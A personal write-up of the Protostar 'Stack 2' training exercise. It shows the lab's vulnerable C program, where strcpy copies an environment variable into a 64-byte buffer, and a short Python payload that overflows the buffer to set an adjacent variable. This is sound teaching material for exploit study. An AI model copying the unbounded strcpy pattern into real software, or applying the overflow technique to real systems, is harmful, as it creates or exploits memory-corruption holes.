
___________________________________________ EXPLOIT EXERCISES _________________________________________
			
========= Abhinav Thakur
========= compilepeace@gmail.com


######### PROTOSTAR

                                  =-=-=-=-=-=   STACK - 2   =-=-=-=-=




1.	First I log into the virtual machine with
		username : user
		password : user



2.	Source code provided is - 

	#include <stdlib.h>
	#include <unistd.h>
	#include <stdio.h>
	#include <string.h>

	int main(int argc, char **argv)
	{
	  volatile int modified;
	  char buffer[64];
	  char *variable;

		variable = getenv("GREENIE");

	  if(variable == NULL) {
	      errx(1, "please set the GREENIE environment variable\n");
	  }

	  modified = 0;

	  strcpy(buffer, variable);

	  if(modified == 0x0d0a0d0a) {
	      printf("you have correctly modified the variable\n");
	  } else {
	      printf("Try again, you got 0x%08x\n", modified);
	  }

	}



3.	This is also similar to the previous probleum, only it uses the 'getenv(char *)' which 
	takes in the environment variable name and returns its value. Here strcpy() is used -
	"strcpy(buffer, variable)" which does not check bound checking while copying data. 
	This statement copies the string stored in environment varible 'GREENIE' into 'buffer'
	Therefore we need to pass our crafted input to environment variable and name it to 
	'GREENIE'.


4. 	We use command substitution to store string in a shell variable

		$ GREENIE=$(python -c 'print "A"*64 + "\x0a\x0d\x0a\x0d"')		
		
	Now we export this variable and run the binary 'stack2'
	
		$ export GREENIE		
		$ ./stack2
		you have correctly modified the variable


	Cheers,	


